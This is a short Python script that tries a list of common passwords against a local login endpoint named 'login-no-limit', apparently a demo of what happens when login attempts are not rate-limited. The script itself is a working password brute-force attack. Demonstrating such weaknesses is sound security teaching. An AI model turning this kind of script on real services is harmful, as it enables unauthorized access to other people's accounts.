import requests
username = 'user'
url = 'http://localhost:3001/api/login-no-limit'

password_list = [
    '123456', 'password', 'admin', 'letmein', 'password123', 'qwerty',
    'password1', '12345', '1234', '123456789', 'test123', 'password1234',
    'passw0rd', '12345678', 'abc123', 'password!', 'password12345'
]

def brute_force():
    for password in password_list:
        try:
            response = requests.post(url, json={'username': username, 'password': password})
            data = response.json()
            print(f'Tried password: "{password}" - Response: {data.get("message")}')
            if data.get('message') == 'Login successful':
                print(f'Password FOUND: {password}')
                break
        except Exception as e:
            print(f'Error trying password "{password}": {e}')

if __name__ == '__main__':
    brute_force()
